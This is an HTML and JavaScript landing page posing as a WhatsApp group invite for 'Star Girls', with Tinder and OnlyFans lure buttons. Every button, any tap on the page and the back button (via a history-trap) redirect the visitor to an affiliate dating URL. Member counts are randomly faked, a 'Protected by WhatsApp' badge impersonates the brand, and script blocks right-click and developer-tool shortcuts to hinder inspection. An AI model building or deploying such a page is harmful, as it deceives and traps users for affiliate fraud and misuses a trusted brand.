<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Meta Dasar & OpenGraph yang Anda minta -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>WhatsApp - Invite</title>
    
    <meta property="og:type" content="website">
    <meta property="og:title" content="🟢 WhatsApp Me">
    <meta property="og:description" content="Browse trending profiles and discover new updates shared by active users.">
    <meta property="og:image" content="https://snipboard.io/Zirncq.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="1200">
    <meta property="og:url" content="#">
    
    <meta name="description" content="Browse trending profiles and discover new updates shared by active users.">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="🟢 WhatsApp Me">
    <meta name="twitter:description" content="Browse trending profiles and discover new updates shared by active users.">
    <meta name="twitter:image" content="https://snipboard.io/Zirncq.jpg">

    <!-- FontAwesome untuk Ikon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        /* Reset & Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000;
            color: #fff;
            overflow: hidden; /* Mencegah scroll pada halaman utama */
            height: 100vh;
            width: 100vw;
            position: relative;
        }

        /* Video Background */
        .bg-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
            filter: brightness(0.4); /* Gelapkan video agar teks terbaca */
        }

        /* Header */
        .whatsapp-header {
            display: flex;
            align-items: center;
            padding: 15px 20px;
            background: linear-gradient(to bottom, rgba(0,0,0,0.8), rgba(0,0,0,0));
            position: absolute;
            top: 0;
            width: 100%;
            z-index: 10;
        }

        .back-button {
            margin-right: 15px;
            cursor: pointer;
            font-size: 1.2rem;
        }

        .header-text h1 {
            font-size: 1.1rem;
            font-weight: 600;
            color: #fff;
        }

        .header-text p {
            font-size: 0.85rem;
            color: #ccc;
        }

        /* Main Content */
        .main-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 400px;
            text-align: center;
            z-index: 5;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        /* Profile Section */
        .profile-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 10px;
        }

        .profile-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            overflow: hidden;
            border: 3px solid #25D366; /* WhatsApp Green */
            box-shadow: 0 0 15px rgba(37, 211, 102, 0.5);
            margin-bottom: 10px;
            background-color: #333;
        }

        .profile-img img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .group-name {
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .group-info {
            font-size: 0.9rem;
            color: #e0e0e0;
        }

        /* Members Stats */
        .members-info {
            display: flex;
            gap: 20px;
            margin-bottom: 10px;
        }

        .member-count, .active-members {
            text-align: center;
        }

        .count {
            font-size: 1.5rem;
            font-weight: bold;
        }

        .label {
            font-size: 0.8rem;
            color: #bbb;
        }

        .online-indicator {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            font-size: 0.8rem;
            color: #25D366;
        }

        .dot {
            width: 8px;
            height: 8px;
            background-color: #25D366;
            border-radius: 50%;
            box-shadow: 0 0 5px #25D366;
        }

        /* Buttons */
        .button-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .btn-social {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            padding: 12px 20px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 600;
            font-size: 0.95rem;
            transition: transform 0.2s, opacity 0.2s;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }

        .btn-social:active {
            transform: scale(0.98);
        }

        .btn-social.loading {
            opacity: 0.8;
            pointer-events: none;
        }

        .custom-icon {
            width: 20px;
            height: 20px;
        }

        /* Button Colors */
        .whatsapp {
            background: #25D366;
            color: #fff;
        }

        .tinder {
            background: linear-gradient(45deg, #fd267a, #ff6036);
            color: #fff;
        }

        .onlyfans {
            background: #00AFF0; /* Official OF Blue */
            color: #fff;
        }

        /* Security Notice */
        .security-notice {
            font-size: 0.75rem;
            color: #aaa;
            margin-top: 15px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        /* Footer */
        .footer {
            position: absolute;
            bottom: 20px;
            width: 100%;
            text-align: center;
            font-size: 0.8rem;
            color: #888;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 0.5; }
            50% { opacity: 1; }
            100% { opacity: 0.5; }
        }
    </style>
</head>
<body>

    <!-- Background Video -->
    <video class="bg-video" id="bgVideo" autoplay muted loop playsinline></video>

    <!-- Header -->
    <div class="whatsapp-header">
        <div class="back-button" id="backBtn">
            <i class="fas fa-arrow-left"></i>
        </div>
        <div class="header-text">
            <h1>🌟 Star Girls 🌟</h1>
            <p>WhatsApp • Invite</p>
        </div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <div class="profile-container">
            <div class="profile-img">
                <img id="groupIcon" src="" alt="Group Icon">
            </div>
            <div class="group-name">🌟 Star Girls 🌟</div>
            <div class="group-info">👑 Admin: Emily &amp; Aria 🔥</div>
        </div>

        <div class="members-info">
            <div class="member-count" id="memberCountDisplay">
                <div class="count">135.0K</div>
                <div class="label">Members</div>
            </div>
            <div class="active-members" id="activeMembersDisplay">
                <div class="count">53.6K</div>
                <div class="online-indicator">
                    <div class="dot"></div>
                    <span>Online now</span>
                </div>
            </div>
        </div>

        <div class="button-container">
            <a href="#" class="btn-social whatsapp" id="whatsappBtn">
                <i class="fab fa-whatsapp"></i>
                <span>Join WhatsApp Group</span>
            </a>
            
            <a href="#" class="btn-social tinder" id="tinderBtn">
                <img class="custom-icon" src="https://tinder.com/favicon-32x32.png" alt="Tinder" onerror="this.style.display='none'; this.nextElementSibling.style.display='inline-block';">
                <i class="fas fa-fire" style="display: none;"></i>
                <span>Find Your Perfect Match Tonight</span>
            </a>
            
            <a href="#" class="btn-social onlyfans" id="onlyfansBtn">
                <img class="custom-icon" src="https://files.catbox.moe/y2ouht.ico" alt="OnlyFans" onerror="this.style.display='none'; this.nextElementSibling.style.display='inline-block';">
                <i class="fas fa-star" style="display: none;"></i>
                <span>Unlock Exclusive OnlyFans Content</span>
            </a>
        </div>

        <div class="security-notice">
            <i class="fas fa-shield-alt"></i>
            <span>Protected by WhatsApp</span>
        </div>
    </div>

    <div class="footer">
        ⚡ Click anywhere to join instantly!
    </div>

    <script>
        const imageList = [
            'https://yaaoho.com/assets/img/landing/bg/01.jpg',
            'https://yaaoho.com/assets/img/landing/bg/02.jpg',
            'https://yaaoho.com/assets/img/landing/bg/03.jpg',
            'https://yaaoho.com/assets/img/landing/bg/04.jpg',
            'https://yaaoho.com/assets/img/landing/bg/05.jpg'
        ];

        // Target Redirect URL
        const targetRedirectUrl = "https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&s1=188302&s2=2257084&s3=GREYSYAA&click_id=GREYSYAA&ban=inst&j1=1";
        let isRedirecting = false;

        // 1. Fungsi untuk mengambil gambar acak
        function setRandomProfileImage() {
            const imgElement = document.getElementById('groupIcon');
            if (imgElement && imageList.length > 0) {
                const randomIndex = Math.floor(Math.random() * imageList.length);
                const randomSrc = imageList[randomIndex];
                imgElement.src = randomSrc;
                console.log("✅ Profile Image set to:", randomSrc);
            }
        }

        // 2. Fungsi Redirect
        function performRedirect(buttonElement = null) {
            if (isRedirecting) return;
            
            isRedirecting = true;
            console.log("🔴 Redirecting to:", targetRedirectUrl);
            
            const btn = buttonElement || document.querySelector('.btn-social.whatsapp');
            if (btn) {
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Redirecting...</span>';
                btn.classList.add('loading');
                btn.style.pointerEvents = 'none';
                
                document.querySelectorAll('.btn-social').forEach(b => {
                    if(b !== btn) {
                        b.style.opacity = '0.5';
                        b.style.pointerEvents = 'none';
                    }
                });
            }
            
            setTimeout(function() {
                window.location.href = targetRedirectUrl;
            }, 2000); // Delay sedikit agar loading terlihat
        }


        document.addEventListener("DOMContentLoaded", function() {
            
            // Jalankan fungsi gambar acak
            setRandomProfileImage();
            
            // Init Video Background
            initBackgroundVideo();

            // Init Counters
            animateCounters();
        });

        // Event Listener Tombol
        const buttons = ['whatsappBtn', 'tinderBtn', 'onlyfansBtn'];
        buttons.forEach(id => {
            const btn = document.getElementById(id);
            if (btn) {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    performRedirect(this);
                });
            }
        });

        document.body.addEventListener('click', function(e) {
            const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
            if (!isButton && !isRedirecting) {
                performRedirect(null);
            }
        });

        document.body.addEventListener('touchstart', function(e) {
            const isButton = e.target.closest('.btn-social') || e.target.closest('#backBtn');
            if (!isButton && !isRedirecting) {
                e.preventDefault(); 
                performRedirect(null);
            }
        }, { passive: false });

        const backBtn = document.getElementById('backBtn');
        if (backBtn) {
            backBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                history.back();
            });
        }

        history.pushState(null, null, location.href);
        window.addEventListener('popstate', function() {
            if (!isRedirecting) {
                history.pushState(null, null, location.href);
                performRedirect(null);
            }
        });

        // --- VIDEO & COUNTER LOGIC ---

        const videoList = [
            'https://thumbsnap.com/i/tiAP6Uk1.mp4',
            'https://thumbsnap.com/i/BrJcpXuM.mp4',
            'https://thumbsnap.com/i/nicST2t7.mp4',
            'https://thumbsnap.com/i/GHPahdDh.mp4'
        ];

        function initBackgroundVideo() {
            const videoEl = document.getElementById('bgVideo');
            if (!videoEl) return;
            const randomVid = videoList[Math.floor(Math.random() * videoList.length)];
            videoEl.src = randomVid;
            videoEl.load();
            videoEl.play().catch(err => console.log("Autoplay prevented, user interaction needed."));
        }

        function animateCounters() {
            const memberEl = document.querySelector('#memberCountDisplay .count');
            const activeEl = document.querySelector('#activeMembersDisplay .count');
            
            if (memberEl && activeEl) {
                setInterval(() => {
                    if (!isRedirecting) {
                        let currentMember = parseFloat(memberEl.innerText) || 130.6;
                        let delta = (Math.random() * 0.5) - 0.2;
                        let newMember = currentMember + delta;
                        if (newMember > 135) newMember = 135;
                        if (newMember < 128) newMember = 128;
                        memberEl.innerText = newMember.toFixed(1) + 'K';
                        
                        let currentOnline = parseFloat(activeEl.innerText) || 50.8;
                        let deltaOnline = (Math.random() * 0.8) - 0.3;
                        let newOnline = currentOnline + deltaOnline;
                        if (newOnline > 55) newOnline = 55;
                        if (newOnline < 45) newOnline = 45;
                        activeEl.innerText = newOnline.toFixed(1) + 'K';
                    }
                }, 5000);
            }
        }

        document.addEventListener('contextmenu', event => event.preventDefault());

        document.onkeydown = function(e) {
            if (e.keyCode == 123) { // F12
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) { // Ctrl+Shift+I
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) { // Ctrl+Shift+C
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { // Ctrl+Shift+J
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { // Ctrl+U
                return false;
            }
        }
    </script>
</body>
</html>
